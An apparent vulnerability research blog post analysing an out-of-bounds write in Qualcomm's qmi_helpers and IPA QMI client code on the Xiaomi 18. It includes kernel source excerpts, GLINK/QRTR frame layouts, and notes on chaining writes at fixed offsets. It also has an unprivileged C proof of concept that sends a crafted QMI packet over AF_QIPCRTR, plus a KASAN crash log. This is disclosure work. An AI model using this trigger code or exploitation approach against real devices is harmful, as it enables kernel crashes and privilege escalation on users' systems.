---
title: "Xiaomi 18 HyperOS - CP-to-AP / local unpriv out-of-bounds write in qmi_helpers 2/2"
published: 2026-11-10
tags: ["linux", "nasm", "pwn", "0day", "poc", "research", "baseband", "kernel"]
category: "research"
description: Write-up about an out-of-bounds write I found in qmi_helpers device shipped in the Xiaomi 18 which turns out to be a LPE vector as well if you are using the IPA driver.
---


In my previous post I digged into the rmnet driver, especially the version shipped in the recent Xiaomi 18 releases. For this blogpost I am targeting [Qualcomm MSM Interface](https://github.com/qualcomm/qmi-framework) (QMI).

> QMI is an IPC protocol used between software components hosted among a network of processors within a System-On-Chip (SoC).

QMI is a promising target because it has features a vulnerability research loves to research about:
- Built using an asynchronous interface model
- TLV: Every message payload is serialized as a sequence of Type-Length-Value (TLV)
- parsing user controlled data received by the modem (baseband)

# Introduction

For this post we do not dig to perform a lot of reversing because the [LineageOs repo](https://github.com/zorn-trees/android_kernel_xiaomi_sm8650-modules/tree/lineage-23.2) containing the drivers used by the almost same chipset (`Qualcomm Snapdragon 8 Elite Gen 3` vs `Qualcomm Snapdragon 8 Elite Gen 6`) so I will use both these open source vendor drivers for the rca / dynamic replay of the bug as well as the upstream QMI driver (but that's a slightly different story :0).

The first thing I tried to understand about this driver was how easy it was to reach from the baseband. To process QMI packets from the baseband we need to go through two different layers: GLINK and QRTR.

GLINK will be the transport-layer IPC which will parse the SMEM (shared DMA between the CP and the AP), it will then forward the data to the routing layer, QRTR (Qualcomm IPC Router).

QRTR will route the data (in our case QMI packets) to a specific registrered node indicating to the target service that the data are coming from the DMA. In a QRTR frame you may also ask for an acknowledgement.

And finally the QMI packet is delivered to the application layer (in our case the QMI service itself). To reach the QMI client from the DMA we would need these headers:

```
GLINK DATA record (16-byte header; offsets relative to GLINK)
  +0x00 u16 cmd        = 9       TX_DATA
  +0x02 u16 channel    = 1       channel ID for IPCRTR here
  +0x04 u32 intent     = 1
  +0x08 u32 chunk_size = 216
  +0x0c u32 left_size  = 0
  +0x10                         start of QRTR frame

QRTR v1 frame (32-byte header; offsets relative to QRTR)
  +0x00 u32 version    = 1
  +0x04 u32 type       = 1       QRTR DATA packet
  +0x08 u32 src_node   = 2       DMA
  +0x0c u32 src_port   = 0x1111  DMA
  +0x10 u32 confirm_rx = 0       no ack needed
  +0x14 u32 size       = 183
  +0x18 u32 dst_node   = 1       IPA qmi client node
  +0x1c u32 dst_port   = 0x4000  IPA qmi client port
  +0x20                         start of QMI message
```

The QMI packet is finally transmitted to `qmi_data_ready_work`:
```c
// upstream 7.4 code
static void qmi_data_ready_work(struct work_struct *work)
{
	struct qmi_handle *qmi = container_of(work, struct qmi_handle, work);
	struct qmi_ops *ops = &qmi->ops;
	struct sockaddr_qrtr sq;
	struct msghdr msg = { .msg_name = &sq, .msg_namelen = sizeof(sq) };
	struct kvec iv;
	ssize_t msglen;

	for (;;) {
		iv.iov_base = qmi->recv_buf;
		iv.iov_len = qmi->recv_buf_size;

		mutex_lock(&qmi->sock_lock);
		if (qmi->sock)
			msglen = kernel_recvmsg(qmi->sock, &msg, &iv, 1,
						iv.iov_len, MSG_DONTWAIT);
		else
			msglen = -EPIPE;
		mutex_unlock(&qmi->sock_lock);
		if (msglen == -EAGAIN)
			break;

		if (msglen == -ENETRESET) {
			qmi_handle_net_reset(qmi);

			/* The old qmi->sock is gone, our work is done */
			break;
		}

		if (msglen < 0) {
			pr_err("qmi recvmsg failed: %zd\n", msglen);
			break;
		}

		if (sq.sq_node == qmi->sq.sq_node &&
		    sq.sq_port == QRTR_PORT_CTRL) {
			qmi_recv_ctrl_pkt(qmi, qmi->recv_buf, msglen);
		} else if (ops->msg_handler) {
			ops->msg_handler(qmi, &sq, qmi->recv_buf, msglen);
		} else {
			qmi_handle_message(qmi, &sq, qmi->recv_buf, msglen);
		}
	}
}
```

It will just continuously fetch the content data received in the `sockaddr_qrtr` sockets and process them with `qmi_handle_message` which will sanitize the header size and call `qmi_invoke_handler`.

# Root-cause analysis

The QMI client registers different handlers in `ipa_qmi_service.c`:
```c
/*  clinet_handlers are client callbacks that will be called from QMI context
 *  when an indication from Q6 server arrives.
 *  In our case, client_handlers needs handling only for QMI_INDICATION,
 *  since the QMI_REQUEST/ QMI_RESPONSE are handled in a blocking fashion
 *  at the time of sending QMI_REQUESTs.
 */
static struct qmi_msg_handler client_handlers[] = {
	{
		.type = QMI_INDICATION,
		.msg_id = QMI_IPA_DATA_USAGE_QUOTA_REACHED_IND_V01,
		.ei = ipa3_data_usage_quota_reached_ind_msg_data_v01_ei,
		.decoded_size = sizeof(
			struct ipa_data_usage_quota_reached_ind_msg_v01),
		.fn = ipa3_q6_clnt_quota_reached_ind_cb,
	},
	{
		.type = QMI_INDICATION,
		.msg_id = QMI_IPA_INSTALL_UL_FIREWALL_RULES_IND_V01,
		.ei = ipa3_install_fltr_rule_req_msg_data_v01_ei,
		.decoded_size = sizeof(
			struct ipa_configure_ul_firewall_rules_ind_msg_v01),
		.fn = ipa3_q6_clnt_install_firewall_rules_ind_cb,
	},
	{
		.type = QMI_INDICATION,
		.msg_id = QMI_IPA_BW_CHANGE_INDICATION_V01,
		.ei = ipa_bw_change_ind_msg_v01_ei,
		.decoded_size = IPA_BW_CHANGE_IND_MSG_V01_MAX_MSG_LEN,
		.fn = ipa3_q6_clnt_bw_change_ind_cb,
	},
	{},
};
```

Actually the bug is just here in the client handlers registration, `ipa3_install_fltr_rule_req_msg_data_v01_ei` represents an array of structs 

The flags define client's behaviour:
```c
#define QMI_REQUEST	0 // queries the baseband from a client
#define QMI_RESPONSE	2 // response from the server (baseband)
#define QMI_INDICATION	4 // Asynchronous Notification
```

The first bug is lying in `qmi_invoke_handler`:

```c
/**
 * qmi_invoke_handler() - find and invoke a handler for a message
 * @qmi:	qmi handle
 * @sq:		sockaddr of the sender
 * @txn:	transaction object for the message
 * @buf:	buffer containing the message
 * @len:	length of @buf
 *
 * Find handler and invoke handler for the incoming message.
 */
static void qmi_invoke_handler(struct qmi_handle *qmi, struct sockaddr_qrtr *sq,
			       struct qmi_txn *txn, const void *buf, size_t len)
{
	const struct qmi_msg_handler *handler;
	const struct qmi_header *hdr = buf;
	void *dest;
	int ret;

	if (!qmi->handlers)
		return;

	for (handler = qmi->handlers; handler->fn; handler++) {
		if (handler->type == hdr->type &&
		    handler->msg_id == le16_to_cpu(hdr->msg_id))
			break;
	}

	if (!handler->fn)
		return;

	dest = kzalloc(handler->decoded_size, GFP_KERNEL);
	if (!dest)
		return;

	ret = qmi_decode_message(buf, len, handler->ei, dest);
	if (ret < 0)
		pr_err("failed to decode incoming message\n");
	else
		handler->fn(qmi, sq, txn, dest);

	kfree(dest);
}
```

Then `qmi_decode_message` calls `qmi_decode` with the `decoded_size`-length dest previously allocated.

```c
int qmi_decode_message(const void *buf, size_t len,
		       const struct qmi_elem_info *ei, void *c_struct)
{
	if (!ei)
		return -EINVAL;

	if (!c_struct || !buf || !len)
		return -EINVAL;

	return qmi_decode(ei, c_struct, buf + sizeof(struct qmi_header),
			  len - sizeof(struct qmi_header), 1);
}
```

And finally `qmi_decode` is the main decoding routine:
```c
static int qmi_decode(const struct qmi_elem_info *ei_array, void *out_c_struct,
		      const void *in_buf, u32 in_buf_len,
		      int dec_level)
{
	const struct qmi_elem_info *temp_ei = ei_array;
	u8 opt_flag_value = 1;
	u32 data_len_value = 0, data_len_sz = 0;
	u8 *buf_dst = out_c_struct;
	const u8 *tlv_pointer;
	u32 tlv_len = 0;
	u32 tlv_type;
	u32 decoded_bytes = 0;
	const void *buf_src = in_buf;
	int rc;
	u8 val8;
	u16 val16;

	while (decoded_bytes < in_buf_len) {
		if (dec_level >= 2 && temp_ei->data_type == QMI_EOTI)
			return decoded_bytes;

		if (dec_level == 1) {
			tlv_pointer = buf_src;
			QMI_ENCDEC_DECODE_TLV(&tlv_type,
					      &tlv_len, tlv_pointer);
			buf_src += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
			decoded_bytes += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
			temp_ei = find_ei(ei_array, tlv_type);
			if (!temp_ei && tlv_type < OPTIONAL_TLV_TYPE_START) {
				pr_err("%s: Inval element info\n", __func__);
				return -EINVAL;
			} else if (!temp_ei) {
				UPDATE_DECODE_VARIABLES(buf_src,
							decoded_bytes, tlv_len);
				continue;
			}
		} else {
			/*
			 * No length information for elements in nested
			 * structures. So use remaining decodable buffer space.
			 */
			tlv_len = in_buf_len - decoded_bytes;
		}

		buf_dst = out_c_struct + temp_ei->offset;
		if (temp_ei->data_type == QMI_OPT_FLAG) {
			memcpy(buf_dst, &opt_flag_value, sizeof(u8));
			temp_ei = temp_ei + 1;
			buf_dst = out_c_struct + temp_ei->offset;
		}

		if (temp_ei->data_type == QMI_DATA_LEN) {
			data_len_sz = temp_ei->elem_size == sizeof(u8) ?
					sizeof(u8) : sizeof(u16);
			if (data_len_sz == sizeof(u8)) {
				rc = qmi_decode_basic_elem(&val8, buf_src,
							   1, data_len_sz);
				if (rc < 0)
					return rc;
				data_len_value = (u32)val8;
			} else {
				rc = qmi_decode_basic_elem(&val16, buf_src,
							   1, data_len_sz);
				if (rc < 0)
					return rc;
				data_len_value = (u32)val16;
			}
			memcpy(buf_dst, &data_len_value, sizeof(u32));
			temp_ei = temp_ei + 1;
			buf_dst = out_c_struct + temp_ei->offset;
			tlv_len -= data_len_sz;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
		}

		if (temp_ei->array_type == NO_ARRAY) {
			data_len_value = 1;
		} else if (temp_ei->array_type == STATIC_ARRAY) {
			data_len_value = temp_ei->elem_len;
		} else if (data_len_value > temp_ei->elem_len) {
			pr_err("%s: Data len %d > max spec %d\n",
			       __func__, data_len_value, temp_ei->elem_len);
			return -ETOOSMALL;
		}

		switch (temp_ei->data_type) {
		case QMI_UNSIGNED_1_BYTE:
		case QMI_UNSIGNED_2_BYTE:
		case QMI_UNSIGNED_4_BYTE:
		case QMI_UNSIGNED_8_BYTE:
		case QMI_SIGNED_2_BYTE_ENUM:
		case QMI_SIGNED_4_BYTE_ENUM:
			rc = qmi_decode_basic_elem(buf_dst, buf_src,
						   data_len_value,
						   temp_ei->elem_size);
			if (rc < 0)
				return rc;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		case QMI_STRUCT:
			rc = qmi_decode_struct_elem(temp_ei, buf_dst, buf_src,
						    data_len_value, tlv_len,
						    dec_level + 1);
			if (rc < 0)
				return rc;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		case QMI_STRING:
			rc = qmi_decode_string_elem(temp_ei, buf_dst, buf_src,
						    tlv_len, dec_level);
			if (rc < 0)
				return rc;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		default:
			pr_err("%s: Unrecognized data type\n", __func__);
			return -EINVAL;
		}
		temp_ei = temp_ei + 1;
	}

	return decoded_bytes;
}
```

The function will iterate through our input and parse the TLV structs into the 8-byte dest and we have full control over `in_buf_len` (the only restriction is for our packet to be > `sizeof(qmi_header)`). That is the out-of-bounds write. For example if we select `tlv_type = 0x11` it will search for the first 0x11 entry in `ipa3_install_fltr_rule_req_msg_data_v01_ei`, its offset evaluates to `0x3508` whill will cause a `memcpy(dest+0x3508, &opt_flag_value, sizeof(u8));`, an oob.

# Exploitation

Actually the bug is pretty interesting because we have to chain out-of-bounds writes in a non-linear way on fixed offsets. 

Let's imagine we want to write to `dest + offsetof(struct ipa_install_fltr_rule_req_msg_v01, xlat_filter_indices_list_len)` which is (`dest + 0x3524`). First its `tlv_type` is 0x14:
```
{
    .data_type	= QMI_DATA_LEN,
    .elem_len	= 1,
    .elem_size	= sizeof(uint8_t),
    .array_type	= NO_ARRAY,
    .tlv_type	= 0x14,
    .offset		= offsetof(
        struct ipa_install_fltr_rule_req_msg_v01,
        xlat_filter_indices_list_len),
},
```

So we will have to iterate through every single 0x14 elements before, causing out-of-bounds writes at other fixed offsets. Furthermore, `QMI_DATA_LEN` only allows to write `(u32)((u8)payload)` at a time so this is not the best. `QMI_UNSIGNED_4_BYTE` is much more interesting (and will be called anyway because it is responsible of writing the value part of the TLV payload):
```c
/**
 * qmi_decode_basic_elem() - Decodes elements of basic/primary data type
 * @buf_dst: Buffer to store the decoded element.
 * @buf_src: Buffer containing the elements in QMI wire format.
 * @elem_len: Number of elements to be decoded.
 * @elem_size: Size of a single instance of the element to be decoded.
 *
 * This function decodes the "elem_len" number of elements in QMI wire format,
 * each of size "elem_size" bytes from the source buffer "buf_src" and stores
 * the decoded elements in the destination buffer "buf_dst". The elements are
 * of primary data type which include u8 - u64 or similar. This
 * function returns the number of bytes of decoded information.
 *
 * Return: The total size of the decoded data elements, in bytes, on success or
 * negative errno on error.
 */
static int qmi_decode_basic_elem(void *buf_dst, const void *buf_src,
				 u32 elem_len, u32 elem_size)
{
	u32 i, rc = 0;

	for (i = 0; i < elem_len; i++) {
		switch (elem_size) {
		case sizeof(u8):
			QMI_ENCDEC_DECODE_U8(buf_dst, buf_src);
			break;
		case sizeof(u16):
			QMI_ENCDEC_DECODE_U16(buf_dst, buf_src);
			break;
		case sizeof(u32):
			QMI_ENCDEC_DECODE_U32(buf_dst, buf_src);
			break;
		case sizeof(u64):
			QMI_ENCDEC_DECODE_U64(buf_dst, buf_src);
			break;
		default:
			pr_err("%s: Unrecognized element size\n", __func__);
			return -EINVAL;
		}

		rc += elem_size;
	}

	return rc;
}
```

It allows a linear overflow on from `dest+0xa240` on `64 * 4` bytes if we select `tlv_type = 0x17`:
```c
{
    .data_type      = QMI_UNSIGNED_4_BYTE,
    .elem_len       = QMI_IPA_MAX_FILTERS_V01, // 64
    .elem_size      = sizeof(uint32_t), // 4
    .array_type       = VAR_LEN_ARRAY,
    .tlv_type       = 0x17,
    .offset         = offsetof(
        struct ipa_install_fltr_rule_req_msg_v01,
        ul_firewall_indices_list), // 0xa240
},
```

But we will have to iter through the previous `0x17` `QMI_DATA_LEN` and `QMI_OPT_FLAG` before which might make the exploit rather unreliable.

# LPE vector?

Funny thing with this bug is that you can trigger the bug on a system using the IPA driver from an unprivileged user using `AF_QIPCRTR` lmao. Which is a very neat kernel out-of-bounds write which requires no privileged (not reachable on android because of the SELinux context). Very simple poc:
```c
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_QIPCRTR
#define AF_QIPCRTR 42
#endif

/* QMI indication 0x003a, TLV 0x10 with one filter rule. */
static const unsigned char rule_qmi[183] = {
	0x04, 0x01, 0x00, 0x3a, 0x00, 0xb0, 0x00,
	0x10, 0xad, 0x00, 0x01,
	0x41, 0x41, 0x41, 0x41,
};

struct sockaddr_qrtr {
	unsigned short sq_family;
	unsigned int sq_node;
	unsigned int sq_port;
};

int main(void)
{
	int s;
	struct sockaddr_qrtr dst = {
		.sq_family = AF_QIPCRTR,
		.sq_node = 1,
		.sq_port = 0x4000,
	};
	ssize_t n;

	if (geteuid() == 0 &&
	    (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 1000))) {
		dprintf(1, "drop privileges: %s\n", strerror(errno));
		return 1;
	}

	dprintf(1, "unprivileged sender: uid=%d euid=%d\n",
		getuid(), geteuid());

	s = socket(AF_QIPCRTR, SOCK_DGRAM, 0);
	if (s < 0) {
		dprintf(1, "socket(AF_QIPCRTR): %s\n", strerror(errno));
		sleep(2);
		return 1;
	}

	n = sendto(s, rule_qmi, sizeof(rule_qmi), 0,
		   (struct sockaddr *)&dst, sizeof(dst));
	dprintf(1, "send port 0x%x: %zd (%s)\n", dst.sq_port, n,
		n < 0 ? strerror(errno) : "ok");
	close(s);
	if (n != sizeof(rule_qmi))
		return 1;

	sleep(5);
	return 0;
}
```

# Conclusion

I reproduced the oob in unicorn on the drivers of the Xiaomi 18 as well as in qemu:
```
[   11.219554] ==================================================================
[   11.220069] BUG: KASAN: slab-out-of-bounds in qmi_decode+0x86c/0xe40 [qmi_helpers]
[   11.221852] Write of size 4 at addr fff000000fbb9d88 by task kworker/u8:2/50
[   11.222117] 
[   11.222129] modem_feed: injected frame to ports 0x4000..0x401f
[   11.223257] CPU: 0 UID: 0 PID: 50 Comm: kworker/u8:2 Tainted: G           O        6.18.0-dirty #2 PREEMPT 
[   11.223864] Tainted: [O]=OOT_MODULE
[   11.223985] Hardware name: linux,dummy-virt (DT)
[   11.224499] Workqueue: qmi_msg_handler qmi_data_ready_work [qmi_helpers]
[   11.225970] Call trace:
[   11.226269]  show_stack+0x2c/0x3c (C)
[   11.227221]  dump_stack_lvl+0xb4/0xd4
[   11.227598]  print_report+0x118/0x5d8
[   11.227913]  kasan_report+0xb0/0xf4
[   11.228216]  kasan_check_range+0x100/0x1a8
[   11.228546]  __asan_memcpy+0x54/0x94
[   11.228887]  qmi_decode+0x86c/0xe40 [qmi_helpers]
[   11.229316]  qmi_decode+0x9b8/0xe40 [qmi_helpers]
[   11.229739]  qmi_decode_message+0x6c/0x94 [qmi_helpers]
[   11.230192]  qmi_invoke_handler+0x1e8/0x304 [qmi_helpers]
[   11.230621]  qmi_handle_message+0x164/0x3b0 [qmi_helpers]
[   11.231048]  qmi_data_ready_work+0x948/0xd78 [qmi_helpers]
[   11.231514]  process_one_work+0x5a4/0xcdc
[   11.231774]  worker_thread+0x744/0xea0
[   11.232023]  kthread+0x3f4/0x774
[   11.232353]  ret_from_fork+0x10/0x20
[   11.232765] 
[   11.232844] Allocated by task 50:
[   11.233038]  kasan_save_stack+0x3c/0x64
[   11.233318]  kasan_save_track+0x20/0x3c
[   11.233572]  kasan_save_alloc_info+0x40/0x54
[   11.233870]  __kasan_kmalloc+0xb8/0xbc
[   11.234117]  __kmalloc_noprof+0x1b4/0x560
[   11.234360]  qmi_invoke_handler+0x1b0/0x304 [qmi_helpers]
[   11.234748]  qmi_handle_message+0x164/0x3b0 [qmi_helpers]
[   11.235132]  qmi_data_ready_work+0x948/0xd78 [qmi_helpers]
[   11.235521]  process_one_work+0x5a4/0xcdc
[   11.235733]  worker_thread+0x744/0xea0
[   11.235937]  kthread+0x3f4/0x774
[   11.236219]  ret_from_fork+0x10/0x20
[   11.236466] 
[   11.236567] The buggy address belongs to the object at fff000000fbb9d80
[   11.236567]  which belongs to the cache kmalloc-8 of size 8
[   11.236770] The buggy address is located 0 bytes to the right of
[   11.236770]  allocated 8-byte region [fff000000fbb9d80, fff000000fbb9d88)
[   11.236982] 
[   11.237103] The buggy address belongs to the physical page:
[   11.237590] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4fbb9
[   11.238043] flags: 0x3fffe0000000000(node=0|zone=0|lastcpupid=0x1ffff)
[   11.238509] page_type: f5(slab)
[   11.239082] raw: 03fffe0000000000 fff0000009401500 dead000000000122 0000000000000000
[   11.239306] raw: 0000000000000000 0000000080800080 00000000f5000000 0000000000000000
[   11.239519] page dumped because: kasan: bad access detected
[   11.239626] 
[   11.239691] Memory state around the buggy address:
[   11.240058]  fff000000fbb9c80: fa fc fc fc fa fc fc fc fa fc fc fc 00 fc fc fc
[   11.240246]  fff000000fbb9d00: 00 fc fc fc 00 fc fc fc fa fc fc fc fa fc fc fc
[   11.240412] >fff000000fbb9d80: 00 fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   11.240548]                       ^
[   11.240726]  fff000000fbb9e00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   11.240876]  fff000000fbb9e80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   11.241016] ==================================================================
[   11.242069] Kernel panic - not syncing: kasan.fault=panic set ...
[   11.256872] CPU: 0 UID: 0 PID: 50 Comm: kworker/u8:2 Tainted: G           O        6.18.0-dirty #2 PREEMPT 
[   11.257576] Tainted: [O]=OOT_MODULE
[   11.257877] Hardware name: linux,dummy-virt (DT)
[   11.258236] Workqueue: qmi_msg_handler qmi_data_ready_work [qmi_helpers]
[   11.259055] Call trace:
[   11.259347]  show_stack+0x2c/0x3c (C)
[   11.259860]  dump_stack_lvl+0x50/0xd4
[   11.260442]  dump_stack+0x20/0x2c
[   11.261007]  vpanic+0x544/0x688
[   11.261623]  nmi_panic+0x0/0x10c
[   11.262452]  print_report+0x0/0x5d8
[   11.263407]  kasan_report+0xbc/0xf4
[   11.264332]  kasan_check_range+0x100/0x1a8
[   11.265239]  __asan_memcpy+0x54/0x94
[   11.265859]  qmi_decode+0x86c/0xe40 [qmi_helpers]
[   11.266643]  qmi_decode+0x9b8/0xe40 [qmi_helpers]
[   11.267422]  qmi_decode_message+0x6c/0x94 [qmi_helpers]
[   11.268173]  qmi_invoke_handler+0x1e8/0x304 [qmi_helpers]
[   11.268924]  qmi_handle_message+0x164/0x3b0 [qmi_helpers]
[   11.269694]  qmi_data_ready_work+0x948/0xd78 [qmi_helpers]
[   11.270448]  process_one_work+0x5a4/0xcdc
[   11.271002]  worker_thread+0x744/0xea0
[   11.271492]  kthread+0x3f4/0x774
[   11.272036]  ret_from_fork+0x10/0x20
[   11.272917] SMP: stopping secondary CPUs
[   11.273955] Kernel Offset: 0x12ffc4200000 from 0xffff800080000000
[   11.274402] PHYS_OFFSET: 0x40000000
[   11.274734] CPU features: 0x000000,0001e300,4f7c67c1,0566761f
[   11.275194] Memory Limit: none
```

I will not post the code of my emulator / modified qemu version because I am working on a systematic fuzzer (syzkaller), I might release it later. I hope you enjoyed this blogpost, if you have interesting VR projects plz contact me at: `kernelresearch[at]proton.me`.